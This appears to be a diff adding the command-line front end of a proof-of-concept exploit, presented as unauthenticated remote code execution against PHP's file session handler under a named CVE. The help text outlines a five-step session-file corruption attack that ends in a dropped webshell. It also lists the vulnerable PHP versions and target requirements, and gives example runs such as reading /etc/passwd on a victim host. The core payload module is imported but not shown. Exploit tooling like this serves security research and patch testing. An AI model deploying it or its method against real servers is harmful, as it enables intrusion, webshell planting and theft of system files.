@@ -1,0 +1,128 @@
+#!/usr/bin/env python3
+"""
+phpaftershell-poc - unauthenticated RCE against CVE-2026-126714 (phpAfterShell).
+
+Usage:
+    ./phpaftershell-poc --target http://127.0.0.1:8087 --command 'id'
+"""
+import argparse
+import os
+import sys
+
+sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "poc"))
+
+import remote  # noqa: E402
+
+VERSION = "1.0.0"
+
+# 5x6 bitmap font (figlet-style block letters)
+FONT = {
+    "P": ["████.", "█...█", "█...█", "████.", "█....", "█...."],
+    "H": ["█...█", "█...█", "█████", "█...█", "█...█", "█...█"],
+    "A": [".███.", "█...█", "█...█", "█████", "█...█", "█...█"],
+    "F": ["█████", "█....", "████.", "█....", "█....", "█...."],
+    "T": ["█████", "..█..", "..█..", "..█..", "..█..", "..█.."],
+    "E": ["█████", "█....", "████.", "█....", "█....", "█████"],
+    "R": ["████.", "█...█", "████.", "█.█..", "█..█.", "█...█"],
+    "S": [".####", "#....", "#####", "....#", "...##", "####."],
+    "L": ["█....", "█....", "█....", "█....", "█....", "█████"],
+    " ": ["..", "..", "..", "..", "..", ".."],
+}
+
+
+def banner() -> str:
+    word = "PHPAfterShell"
+    rows = [""] * 6
+    for ch in word:
+        glyph = FONT.get(ch, FONT[" "])
+        for i in range(6):
+            rows[i] += glyph[i] + " "
+    line = "\n".join(r.rstrip() for r in rows)
+    return (
+        f"\033[1;31m{line}\033[0m\n"
+        "\033[1;33m"
+        "   CVE-2026-126714  ·  unauthenticated remote code execution  ·  "
+        f"v{VERSION}\033[0m\n"
+        "\033[2m   depthfirst research · for authorized testing only\033[0m\n"
+    )
+
+
+EPILOG = """\
+examples:
+  %(prog)s --target http://127.0.0.1:8087 --command 'id'
+  %(prog)s --target http://victim.local:8080 --command 'cat /etc/passwd'
+  %(prog)s --target http://127.0.0.1:8087 --command 'uname -a' --attempts 40
+
+how it works:
+  1. an upload-progress request (held) plants the carrier session record
+  2. an ordinary POST stores the gadget payload in $_SESSION['bio']
+  3. held filler connections load the target's memory-bounded cgroup
+  4. the replacement upload-progress request makes PHP rewrite the session;
+     the victim's own pwrite() blows the cgroup budget mid-write and the
+     inode keeps R[0:k] || C[k:]  - the interrupted write from the advisory
+  5. any later session_start() parses the spliced file and promotes the
+     planted bytes into a live FileCache object; its __destruct drops a
+     webshell -> command execution
+
+requirements:
+  · target runs a vulnerable PHP (8.2 < 8.2.36, 8.3 < 8.3.37,
+    8.4 < 8.4.28, 8.5 < 8.5.13) with the default file session handler
+  · target is memory-bounded (container mem_limit - the bundled lab uses 64m)
+  · target application contains a destructor gadget (the bundled demo app
+    ships a representative FileCache; real apps/frameworks have their own)
+  · low-latency network to the target (the bundled lab is localhost)
+
+exit codes:
+  0  command executed, output printed
+  2  no hit within the attempt budget / unreachable target
+"""
+
+
+def main() -> int:
+    print(banner())
+    p = argparse.ArgumentParser(
+        prog="phpaftershell-poc",
+        description="Exploit CVE-2026-126714 (phpAfterShell): unauthenticated\n"
+                    "remote code execution over plain HTTP, no local access\n"
+                    "to the target required.",
+        epilog=EPILOG,
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    p.add_argument("--target", required=True, metavar="URL",
+                   help="base URL of the target, e.g. http://127.0.0.1:8087")
+    p.add_argument("--command", required=True, metavar="CMD",
+                   help="shell command to execute on the target")
+    p.add_argument("--attempts", type=int, default=40, metavar="N",
+                   help="maximum interruption attempts (default: 40)")
+    p.add_argument("-q", "--quiet", action="store_true",
+                   help="only print the command output")
+    p.add_argument("--version", action="version",
+                   version=f"%(prog)s {VERSION}")
+    args = p.parse_args()
+
+    target = args.target.rstrip("/")
+    if "://" not in target:
+        target = "http://" + target
+    hostport = target.split("://", 1)[1]
+    host, _, port = hostport.partition(":")
+    port = int(port or 80)
+
+    if not args.quiet:
+        print(f"\033[1;36m[*] target  \033[0m{host}:{port}")
+        print(f"\033[1;36m[*] command \033[0m{args.command}\n")
+
+    res = remote.exploit(host, port, args.command, args.attempts,
+                         verbose=not args.quiet)
+    if res.get("error"):
+        print(f"\033[1;31m[!] {res['error']}\033[0m")
+        return 2
+
+    out = (res.get("output") or "").strip()
+    if not args.quiet:
+        print(f"\033[1;32m[+] RCE confirmed - output:\033[0m")
+    print(out)
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
